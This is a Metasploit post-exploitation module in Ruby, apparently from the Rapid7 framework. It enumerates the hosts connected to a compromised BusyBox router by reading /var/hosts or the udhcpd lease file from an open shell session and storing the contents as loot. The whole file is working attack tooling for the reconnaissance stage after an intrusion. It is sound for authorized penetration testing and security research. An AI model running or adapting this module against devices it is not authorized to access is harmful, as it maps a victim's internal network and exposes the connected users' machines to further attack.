##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::File

  def initialize
    super(
      'Name'         => 'BusyBox Enumerate Hosts',
      'Description'  => 'This module will be applied on a session connected 
                         to a BusyBox sh shell. The script will enumerate 
                         the hosts connected to the router or device executing 
                         BusyBox.',
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          [ 'URL', 'http://vallejo.cc']
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell']
    )    
  end



  def run
    
    hostsfile = nil
  
    if file?("/var/hosts")
      hostsfile = "/var/hosts"
    elsif file?("/var/udhcpd/udhcpd.leases")
      hostsfile = "/var/udhcpd/udhcpd.leases"
    else
      # Files not found
      vprint_error("Files not found: /var/hosts, /var/udhcpd/udhcpd.leases")
      return
    end
    
    #File exists
    begin
      str_file=read_file(hostsfile)
      print_good("Hosts File found: #{hostsfile}")
      vprint_line(str_file)
      #Store file
      p = store_loot("Hosts", "text/plain", session, str_file, hostsfile, "BusyBox Device Connected Hosts")
      print_good("Hosts saved to #{p}")
    rescue EOFError
      # If there's nothing in the file, we hit EOFError
      print_error("Nothing read from file: #{hostsfile}, file may be empty")      
    end    
    
  end
 
end
